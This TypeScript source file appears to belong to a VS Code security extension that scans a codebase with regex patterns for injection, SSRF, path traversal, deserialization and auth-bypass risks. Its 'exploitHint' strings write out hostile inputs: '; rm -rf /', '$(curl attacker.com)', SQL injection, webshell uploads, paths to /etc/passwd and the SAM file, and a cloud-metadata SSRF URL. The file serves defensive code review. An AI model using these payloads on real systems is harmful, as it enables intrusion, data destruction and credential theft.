/**
 * AttackSurfaceScanner — Scans codebase for attack surfaces when workspace opens.
 * Finds: API endpoints, auth flows, file upload handlers, SQL queries,
 * deserialization, eval() calls, command injection points, SSRF, path traversal.
 */
import * as vscode from 'vscode';
import * as path from 'path';
import { logger } from '../utils/logger';

export interface AttackSurface {
  file: string;
  line: number;
  column: number;
  type:
    | 'sql_injection_risk'
    | 'command_injection'
    | 'file_upload'
    | 'deserialization'
    | 'eval_usage'
    | 'api_endpoint'
    | 'auth_bypass_risk'
    | 'ssrf_risk'
    | 'path_traversal';
  description: string;
  riskLevel: 'critical' | 'high' | 'medium' | 'low';
  exploitHint: string;
  mitigation: string;
}

interface ScanPattern {
  regex: RegExp;
  type: AttackSurface['type'];
  riskLevel: AttackSurface['riskLevel'];
  description: string;
  exploitHint: string;
  mitigation: string;
}

const SCAN_PATTERNS: ScanPattern[] = [
  {
    regex: /(?:query|execute|raw)\s*\(\s*[`'"]\s*(?:SELECT|INSERT|UPDATE|DELETE).*\$\{/gi,
    type: 'sql_injection_risk',
    riskLevel: 'critical',
    description: 'SQL query with string interpolation — potential SQL injection',
    exploitHint: "Inject ' OR 1=1-- or UNION SELECT payloads via interpolated variable",
    mitigation: 'Use parameterized queries or prepared statements instead of string interpolation',
  },
  {
    regex: /(?:exec|spawn|execSync|spawnSync)\s*\([^)]*(?:\+|`[^`]*\$\{)/gi,
    type: 'command_injection',
    riskLevel: 'critical',
    description: 'Shell command with dynamic input — potential command injection',
    exploitHint: 'Inject ; rm -rf / or $(curl attacker.com) via unsanitized input',
    mitigation: 'Use execFile with argument arrays, never pass user input to shell commands',
  },
  {
    regex: /child_process/gi,
    type: 'command_injection',
    riskLevel: 'medium',
    description: 'child_process module usage — review for command injection',
    exploitHint: 'Check if any arguments derive from user-controlled input',
    mitigation: 'Audit all child_process calls, use allowlists for commands and arguments',
  },
  {
    regex: /(?:multer|formidable|busboy|multipart)/gi,
    type: 'file_upload',
    riskLevel: 'high',
    description: 'File upload handler detected — review for path traversal and malicious file types',
    exploitHint: 'Upload webshell (e.g. shell.php.jpg), path traversal via filename (../../etc/passwd)',
    mitigation: 'Validate file type by magic bytes, randomize filenames, store outside webroot',
  },
  {
    regex: /(?:deserialize|unserialize|pickle\.loads|yaml\.load\s*\([^,)]*\)(?!\s*,\s*Loader))/gi,
    type: 'deserialization',
    riskLevel: 'critical',
    description: 'Unsafe deserialization — potential remote code execution',
    exploitHint: 'Craft malicious serialized payload to achieve RCE via gadget chains',
    mitigation: 'Use safe deserialization (yaml.safe_load, JSON.parse), validate input before deserializing',
  },
  {
    regex: /\beval\s*\(|\bFunction\s*\(/gi,
    type: 'eval_usage',
    riskLevel: 'critical',
    description: 'eval() or Function() constructor — potential code injection',
    exploitHint: 'Inject arbitrary JavaScript via user-controlled string passed to eval',
    mitigation: 'Remove eval/Function usage entirely; use JSON.parse for data, proper APIs for logic',
  },
  {
    regex: /(?:fetch|axios|request|got|http\.get|https\.get)\s*\([^)]*(?:req\.|params\.|query\.|body\.)/gi,
    type: 'ssrf_risk',
    riskLevel: 'high',
    description: 'HTTP request with user-controlled URL — potential SSRF',
    exploitHint: 'Request internal services (http://169.254.169.254/latest/meta-data/) via URL parameter',
    mitigation: 'Validate and allowlist URLs, block private IP ranges, use DNS rebinding protection',
  },
  {
    regex: /(?:readFile|readFileSync|createReadStream|writeFile|writeFileSync)\s*\([^)]*(?:req\.|params\.|query\.|body\.)/gi,
    type: 'path_traversal',
    riskLevel: 'critical',
    description: 'File operation with user-controlled path — potential path traversal',
    exploitHint: 'Use ../../etc/passwd or ..\\..\\windows\\system32\\config\\sam as path parameter',
    mitigation: 'Use path.resolve() and verify result starts with allowed base directory',
  },
  {
    regex: /(?:app|router)\.(?:get|post|put|delete|patch)\s*\(\s*['"`]/gi,
    type: 'api_endpoint',
    riskLevel: 'low',
    description: 'Express route endpoint — review for authentication and authorization',
    exploitHint: 'Test endpoint without authentication, try IDOR by changing IDs',
    mitigation: 'Ensure all sensitive endpoints have authentication middleware and authorization checks',
  },
  {
    regex: /export\s+(?:default\s+)?(?:async\s+)?function\s+handler/gi,
    type: 'api_endpoint',
    riskLevel: 'low',
    description: 'Next.js API route handler — review for authentication and input validation',
    exploitHint: 'Test without auth headers, fuzz query parameters and request body',
    mitigation: 'Add authentication checks, validate all inputs with a schema validator',
  },
  {
    regex: /(?:jwt\.verify|verifyToken|checkAuth|isAuthenticated)\s*\([^)]*\|\|/gi,
    type: 'auth_bypass_risk',
    riskLevel: 'high',
    description: 'Auth check with OR condition — potential authentication bypass',
    exploitHint: 'Exploit short-circuit evaluation in auth check to bypass authentication',
    mitigation: 'Remove OR conditions from auth checks, fail closed (deny by default)',
  },
];

const SKIP_PATTERNS = [
  'node_modules', '.git', 'dist', 'build', '.next', 'vendor',
  '__pycache__', '.venv', 'coverage', '.turbo', 'out',
];

const SCANNABLE_EXTENSIONS = new Set([
  '.ts', '.tsx', '.js', '.jsx', '.mjs', '.cjs',
  '.py', '.rb', '.php', '.java', '.go',
]);

export class AttackSurfaceScanner {
  private diagnosticCollection: vscode.DiagnosticCollection;

  constructor() {
    this.diagnosticCollection = vscode.languages.createDiagnosticCollection('cybermind-attack-surface');
  }

  async scanWorkspace(): Promise<AttackSurface[]> {
    const workspaceFolders = vscode.workspace.workspaceFolders;
    if (!workspaceFolders?.length) return [];

    const files = await vscode.workspace.findFiles(
      '**/*.{ts,tsx,js,jsx,mjs,cjs,py,rb,php,java,go}',
      `**/{${SKIP_PATTERNS.join(',')}}/**`
    );

    const allSurfaces: AttackSurface[] = [];
    const BATCH_SIZE = 20;

    for (let i = 0; i < files.length; i += BATCH_SIZE) {
      const batch = files.slice(i, i + BATCH_SIZE);
      const results = await Promise.all(batch.map(f => this.scanFile(f).catch(() => [])));
      for (const r of results) allSurfaces.push(...r);
    }

    return allSurfaces;
  }

  async scanFile(uri: vscode.Uri): Promise<AttackSurface[]> {
    const filePath = uri.fsPath;

    // Skip non-scannable paths
    for (const skip of SKIP_PATTERNS) {
      if (filePath.includes(skip)) return [];
    }

    const ext = path.extname(filePath).toLowerCase();
    if (!SCANNABLE_EXTENSIONS.has(ext)) return [];

    try {
      const content = await vscode.workspace.fs.readFile(uri);
      const text = Buffer.from(content).toString('utf8');

      // Skip very large files
      if (text.length > 300_000) return [];

      const surfaces: AttackSurface[] = [];
      const lines = text.split('\n');

      for (let lineIdx = 0; lineIdx < lines.length; lineIdx++) {
        const line = lines[lineIdx];

        // Skip comment lines
        const trimmed = line.trim();
        if (
          trimmed.startsWith('//') ||
          trimmed.startsWith('#') ||
          trimmed.startsWith('*') ||
          trimmed.startsWith('/*') ||
          !trimmed
        ) continue;

        for (const pattern of SCAN_PATTERNS) {
          const regex = new RegExp(pattern.regex.source, pattern.regex.flags);
          let match: RegExpExecArray | null;

          while ((match = regex.exec(line)) !== null) {
            surfaces.push({
              file: filePath,
              line: lineIdx,
              column: match.index,
              type: pattern.type,
              description: pattern.description,
              riskLevel: pattern.riskLevel,
              exploitHint: pattern.exploitHint,
              mitigation: pattern.mitigation,
            });
            // Avoid infinite loop on zero-length matches
            if (match.index === regex.lastIndex) regex.lastIndex++;
          }
        }
      }

      // Apply diagnostics for this file
      this.applyDiagnostics(uri, surfaces);
      return surfaces;
    } catch (err) {
      logger.warn(`[AttackSurfaceScanner] Failed to scan ${filePath}: ${String(err)}`);
      return [];
    }
  }

  private applyDiagnostics(uri: vscode.Uri, surfaces: AttackSurface[]): void {
    const diagnostics: vscode.Diagnostic[] = surfaces.map(s => {
      const range = new vscode.Range(
        new vscode.Position(s.line, s.column),
        new vscode.Position(s.line, s.column + 30)
      );

      const severity =
        s.riskLevel === 'critical' || s.riskLevel === 'high'
          ? vscode.DiagnosticSeverity.Warning
          : vscode.DiagnosticSeverity.Information;

      const diag = new vscode.Diagnostic(
        range,
        `[CyberMind] ${s.type.replace(/_/g, ' ').toUpperCase()}: ${s.description}\n⚡ ${s.exploitHint}\n🛡️ ${s.mitigation}`,
        severity
      );
      diag.source = 'CyberMind Attack Surface';
      diag.code = s.type;
      return diag;
    });

    this.diagnosticCollection.set(uri, diagnostics);
  }

  dispose(): void {
    this.diagnosticCollection.dispose();
  }
}
